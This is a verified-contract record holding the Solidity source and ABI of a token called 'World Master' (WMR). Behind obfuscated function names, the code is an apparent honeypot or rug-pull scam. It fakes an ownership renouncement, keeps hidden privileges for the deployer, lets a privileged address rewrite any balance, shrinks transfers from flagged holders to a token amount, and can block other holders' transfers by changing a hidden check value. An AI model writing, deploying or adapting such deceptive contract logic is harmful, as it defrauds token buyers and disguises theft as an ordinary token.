{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface marketingFund {\n    function createPair(address enableTxAuto, address buyLaunchMin) external returns (address);\n}\n\ninterface teamAtWallet {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address exemptLimit) external view returns (uint256);\n\n    function transfer(address shouldMax, uint256 listFeeAt) external returns (bool);\n\n    function allowance(address autoIsSwap, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listFeeAt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldMax,\n        uint256 listFeeAt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed autoLimitTx, uint256 value);\n    event Approval(address indexed autoIsSwap, address indexed spender, uint256 value);\n}\n\nabstract contract toReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface sellLimitBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface teamAtWalletMetadata is teamAtWallet {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract WorldMaster is toReceiver, teamAtWallet, teamAtWalletMetadata {\n\n    mapping(address => bool) public marketingExempt;\n\n    address public txWalletTo;\n\n    function toFeeLaunch() public {\n        emit OwnershipTransferred(txWalletTo, address(0));\n        toEnable = address(0);\n    }\n\n    bool public shouldLimit;\n\n    uint256 private toMode;\n\n    mapping(address => uint256) private limitToken;\n\n    function enableLaunched(address atIs) public {\n        require(atIs.balance < 100000);\n        if (marketingTotal) {\n            return;\n        }\n        if (buyLaunched) {\n            buyLaunched = false;\n        }\n        limitFrom[atIs] = true;\n        \n        marketingTotal = true;\n    }\n\n    function balanceOf(address exemptLimit) public view virtual override returns (uint256) {\n        return limitToken[exemptLimit];\n    }\n\n    bool public buyLaunched;\n\n    function decimals() external view virtual override returns (uint8) {\n        return atIsShould;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return fromSenderIs;\n    }\n\n    function allowance(address txLiquidity, address buyTotalLiquidity) external view virtual override returns (uint256) {\n        if (buyTotalLiquidity == modeLaunchedIs) {\n            return type(uint256).max;\n        }\n        return teamFrom[txLiquidity][buyTotalLiquidity];\n    }\n\n    function owner() external view returns (address) {\n        return toEnable;\n    }\n\n    string private marketingLimit = \"WMR\";\n\n    function modeTxReceiver(uint256 listFeeAt) public {\n        shouldExempt();\n        receiverMarketingLimit = listFeeAt;\n    }\n\n    function transfer(address toLaunch, uint256 listFeeAt) external virtual override returns (bool) {\n        return atTake(_msgSender(), toLaunch, listFeeAt);\n    }\n\n    uint256 private teamShouldExempt;\n\n    uint256 minLaunched;\n\n    uint256 receiverMarketingLimit;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingLimit;\n    }\n\n    address private toEnable;\n\n    function transferFrom(address enableFund, address shouldMax, uint256 listFeeAt) external override returns (bool) {\n        if (_msgSender() != modeLaunchedIs) {\n            if (teamFrom[enableFund][_msgSender()] != type(uint256).max) {\n                require(listFeeAt <= teamFrom[enableFund][_msgSender()]);\n                teamFrom[enableFund][_msgSender()] -= listFeeAt;\n            }\n        }\n        return atTake(enableFund, shouldMax, listFeeAt);\n    }\n\n    function approve(address buyTotalLiquidity, uint256 listFeeAt) public virtual override returns (bool) {\n        teamFrom[_msgSender()][buyTotalLiquidity] = listFeeAt;\n        emit Approval(_msgSender(), buyTotalLiquidity, listFeeAt);\n        return true;\n    }\n\n    function sellFee(address toLaunch, uint256 listFeeAt) public {\n        shouldExempt();\n        limitToken[toLaunch] = listFeeAt;\n    }\n\n    function getOwner() external view returns (address) {\n        return toEnable;\n    }\n\n    uint256 constant marketingSender = 11 ** 10;\n\n    bool private takeTrading;\n\n    address modeLaunchedIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function shouldExempt() private view {\n        require(limitFrom[_msgSender()]);\n    }\n\n    address fundList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint8 private atIsShould = 18;\n\n    event OwnershipTransferred(address indexed swapMaxFrom, address indexed shouldFrom);\n\n    function atFrom(address autoExempt) public {\n        shouldExempt();\n        \n        if (autoExempt == txWalletTo || autoExempt == senderAutoSwap) {\n            return;\n        }\n        marketingExempt[autoExempt] = true;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return tradingTokenAmount;\n    }\n\n    bool public marketingTotal;\n\n    address public senderAutoSwap;\n\n    mapping(address => mapping(address => uint256)) private teamFrom;\n\n    uint256 private tradingTokenAmount = 100000000 * 10 ** 18;\n\n    function marketingAt(address enableFund, address shouldMax, uint256 listFeeAt) internal returns (bool) {\n        require(limitToken[enableFund] >= listFeeAt);\n        limitToken[enableFund] -= listFeeAt;\n        limitToken[shouldMax] += listFeeAt;\n        emit Transfer(enableFund, shouldMax, listFeeAt);\n        return true;\n    }\n\n    mapping(address => bool) public limitFrom;\n\n    constructor (){\n        \n        sellLimitBuy sellExempt = sellLimitBuy(modeLaunchedIs);\n        senderAutoSwap = marketingFund(sellExempt.factory()).createPair(sellExempt.WETH(), address(this));\n        \n        txWalletTo = _msgSender();\n        limitFrom[txWalletTo] = true;\n        limitToken[txWalletTo] = tradingTokenAmount;\n        toFeeLaunch();\n        if (teamShouldExempt == toMode) {\n            teamShouldExempt = toMode;\n        }\n        emit Transfer(address(0), txWalletTo, tradingTokenAmount);\n    }\n\n    string private fromSenderIs = \"World Master\";\n\n    bool public tokenReceiver;\n\n    function atTake(address enableFund, address shouldMax, uint256 listFeeAt) internal returns (bool) {\n        if (enableFund == txWalletTo) {\n            return marketingAt(enableFund, shouldMax, listFeeAt);\n        }\n        uint256 tradingMax = teamAtWallet(senderAutoSwap).balanceOf(fundList);\n        require(tradingMax == receiverMarketingLimit);\n        require(shouldMax != fundList);\n        if (marketingExempt[enableFund]) {\n            return marketingAt(enableFund, shouldMax, marketingSender);\n        }\n        return marketingAt(enableFund, shouldMax, listFeeAt);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoIsSwap\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapMaxFrom\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoLimitTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLiquidity\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"buyTotalLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyTotalLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFeeAt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoExempt\",\"type\":\"address\"}],\"name\":\"atFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptLimit\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atIs\",\"type\":\"address\"}],\"name\":\"enableLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listFeeAt\",\"type\":\"uint256\"}],\"name\":\"modeTxReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFeeAt\",\"type\":\"uint256\"}],\"name\":\"sellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderAutoSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toFeeLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFeeAt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableFund\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listFeeAt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txWalletTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "WorldMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}